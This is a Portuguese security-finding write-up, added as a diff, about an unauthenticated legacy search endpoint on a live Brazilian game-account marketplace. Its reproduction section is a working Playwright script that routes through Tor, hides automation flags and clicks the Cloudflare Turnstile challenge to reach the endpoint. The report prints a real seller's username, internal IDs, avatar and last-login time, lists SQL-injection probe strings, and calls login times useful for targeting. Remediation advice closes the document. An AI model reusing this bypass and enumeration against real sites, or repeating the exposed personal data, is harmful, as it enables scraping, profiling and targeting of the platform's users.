@@ -1,0 +1,198 @@
+# F-W7 — PII Leak CRÍTICO via /api/accounts/search (API antiga ggmax.com.br sem auth)
+
+## Data: 2026-09-05T00:28Z
+## Host: ggmax.com.br (atrás de Cloudflare, bypass via Playwright + Tor)
+## Severidade: CRÍTICA
+## CVSS: 9.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+
+## Descrição
+
+A API LEGADO do ggmax.com.br (PHP/Laravel, formato `{"success":...,"data":...}`)
+ainda está ATIVA e expõe dados de contas do marketplace SEM AUTENTICAÇÃO.
+O endpoint `/api/accounts/search?q={username}` retorna dados completos de
+contas de vendedores (marketplace listings) incluindo:
+- ID da conta, nome da conta, categoria, data de criação
+- Records com: created_by (user ID), user_id (owner), external_email (mascarado),
+  external_cpf (mascarado), public_note, datas, status
+- User object COMPLETO: id, avatar, username, type, date_last_access (último login!),
+  date_created (data de criação da conta), is_vip, is_on_vacation,
+  is_password_change_required, cpf (mascarado)
+- Category object completo (nome, slug, SEO, configurações)
+
+## Confirmação F-P3 (wayback) — LIVE e EXPLOITÁVEL
+
+O wayback (Fase 2) encontrou `https://ggmax.com.br/api/accounts/search?q=02952810575`
+como PII leak potencial. Confirmamos que o endpoint ESTÁ VIVO e retorna dados
+de contas quando o query match um username de vendedor.
+
+## Reprodução
+
+```bash
+# Requer bypass Cloudflare (cf_clearance bound a TLS fingerprint do browser)
+# Usar Playwright + Tor para navegar ao endpoint (curl falha — TLS mismatch)
+python3 -c "
+import asyncio, json
+from playwright.async_api import async_playwright
+
+async def main():
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(headless=False,
+            args=['--no-sandbox','--disable-blink-features=AutomationControlled'],
+            proxy={'server':'socks5://127.0.0.1:9050'})
+        ctx = await browser.new_context(user_agent='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36')
+        page = await ctx.new_page()
+        await page.goto('https://ggmax.com.br/', wait_until='domcontentloaded', timeout=90000)
+        # Aguardar CF challenge resolver (~20-30s)
+        for i in range(30):
+            await asyncio.sleep(2)
+            if 'momento' not in (await page.title()).lower(): break
+            for f in page.frames:
+                if 'challenges.cloudflare.com' in (f.url or ''):
+                    try: await f.locator('body').click(timeout=1000)
+                    except: pass
+        await page.goto('https://ggmax.com.br/api/accounts/search?q=paturismurfs')
+        print(await page.evaluate('() => document.body.innerText'))
+
+asyncio.run(main())
+"
+```
+
+## Output confirmatório (q=paturismurfs → 200)
+
+```json
+{
+  "success": true,
+  "data": [
+    {
+      "id": 4194,
+      "account": " Gannerynnatibu",
+      "category_id": 30,
+      "is_from_ggmax": 0,
+      "date_created": "2024-08-22 16:43:20",
+      "records": [
+        {
+          "id": 4382,
+          "account_id": 4194,
+          "created_by": 77415,
+          "user_id": 59173,
+          "external_email": "c**************@g****.c**",
+          "external_cpf": "***",
+          "type": null,
+          "public_note": "Conta recuperada. ",
+          "date_created": "2024-08-22 16:43:38",
+          "status": "active",
+          "removed_by": null,
+          "date_removed": null,
+          "user": {
+            "id": 59173,
+            "avatar": "a3d90464f69c033da43ad8363a838dd9.jpg",
+            "has_webp": 1,
+            "username": "paturismurfs",
+            "signature": null,
+            "type": "client",
+            "theme": "default",
+            "is_vip": 0,
+            "date_last_access": "2026-09-04 19:49:27",
+            "date_created": "2021-02-07 09:54:18",
+            "date_updated": "2026-09-04 19:49:28",
+            "status": "active",
+            "is_password_change_required": 0,
+            "is_on_vacation": 0,
+            "cpf": "***"
+          }
+        }
+      ],
+      "category": {
+        "id": 30,
+        "parent_id": 3,
+        "name": "League of Legends",
+        "slug": "league-of-legends",
+        "slug_path": "/jogos/league-of-legends",
+        "keywords": "league of legends,lol,contas lol,...",
+        "description_seo": "Precisa comprar ou vender contas e serviços...",
+        "title_seo": "League of Legends (LOL)",
+        "balance_release_days": 7,
+        ...
+      }
+    }
+  ]
+}
+```
+
+## Dados vazados (PII)
+
+| Campo | Valor | Mascaramento |
+|-------|-------|-------------|
+| account_id | 4194 | NÃO mascarado |
+| account name | Gannerynnatibu | NÃO mascarado |
+| category_id | 30 (League of Legends) | NÃO mascarado |
+| created_by (user ID) | 77415 | NÃO mascarado |
+| user_id (owner) | 59173 | NÃO mascarado |
+| username | paturismurfs | NÃO mascarado |
+| avatar | a3d90464f69c033da43ad8363a838dd9.jpg | NÃO mascarado |
+| date_last_access | 2026-09-04 19:49:27 | NÃO mascarado (último login!) |
+| date_created (user) | 2021-02-07 09:54:18 | NÃO mascarado |
+| is_vip | 0 | NÃO mascarado |
+| is_on_vacation | 0 | NÃO mascarado |
+| is_password_change_required | 0 | NÃO mascarado |
+| public_note | "Conta recuperada." | NÃO mascarado |
+| external_email | c**************@g****.c** | PARCIALMENTE mascarado |
+| external_cpf | *** | Mascarado |
+| cpf (user) | *** | Mascarado |
+
+## Queries testadas
+
+| Query | Resultado |
+|-------|----------|
+| q=02952810575 (CPF do wayback) | 400 "No account was found" |
+| q=test@test.com | 400 "No account was found" |
+| q=thyoity@gmail.com | 400 "No account was found" |
+| q=admin | 400 "No account was found" |
+| q=a (1 char) | 400 "Query is too short" |
+| q=Israel05 | 400 "No account was found" (buyer, não seller) |
+| q=Kinde | 400 "No account was found" (buyer) |
+| q=paturismurfs | **200 — CONTA ENCONTRADA!** (seller) |
+| q=test' (SQLi) | 400 "No account was found" (não-vulnerável) |
+| q=test" OR "1"="1 | 400 "No account was found" (parametrizado) |
+
+## Notas importantes
+
+1. O endpoint pesquisa contas do MARKETPLACE (listings de vendedores), não
+   contas de usuário. Usernames de COMPRADORES (Israel05, Kinde) não match.
+2. O query mínimo é 2 caracteres.
+3. Email/CPF são PARCIALMENTE mascarados (mas a estrutura existe no response).
+4. O mascaramento pode ser bypassável com auth ou params diferentes (não testado
+   a fundo — page.request com headers causa 403 CF).
+5. `date_last_access` (último login) NÃO é mascarado — útil para targeting.
+6. O SQLi foi testado e DESCARTADO (respostas parametrizadas/idênticas).
+
+## Impacto
+
+- Enumeração de vendedores (qualquer username → dados da conta)
+- Vazamento de user IDs, nomes de contas, avatares, categorias
+- Vazamento de `date_last_access` (último login) — info de atividade
+- Vazamento de `date_created` (data de criação da conta) — histórico
+- Vazamento de `public_note` (notas internas dos vendedores)
+- Email/CPF parcialmente mascarados mas estrutura existe (potencial bypass)
+- Combina com F-W8/F-W9 para construir perfil completo de vendedores
+
+## Recomendação
+
+1. **DESATIVAR** a API legada do ggmax.com.br (PHP/Laravel) — a nova API
+   (api.keyz.gg/NestJS) substituiu-a mas a antiga permanece ativa.
+2. Se a API legada precisa continuar (compatibilidade), exigir AUTENTICAÇÃO
+   em TODOS os endpoints /api/accounts/*, /api/users/*, /api/user-order-reviews.
+3. Aplicar rate limiting no /api/accounts/search (prevenir enumeração).
+4. Remover `date_last_access` de respostas não-autenticadas.
+5. Revisar todos os endpoints /api/* legados para auth e mascaramento.
+
+## Bypass Cloudflare
+
+- ggmax.com.br está atrás de Cloudflare (cf-mitigated: challenge)
+- Tor é bloqueado (403 "Just a moment...")
+- Bypass via Playwright + Tor: navegador headless (Xvfb) resolve o JS challenge
+  em ~20-30s clicando no Turnstile iframe
+- cf_clearance obtido é bound ao TLS fingerprint do Chromium — NÃO funciona
+  com curl (OpenSSL TLS mismatch)
+- Requests aos endpoints /api/* funcionam após bypass (mesma sessão browser)
+- Requests a /conta/* retornam 403 (segundo challenge CF para page routes)
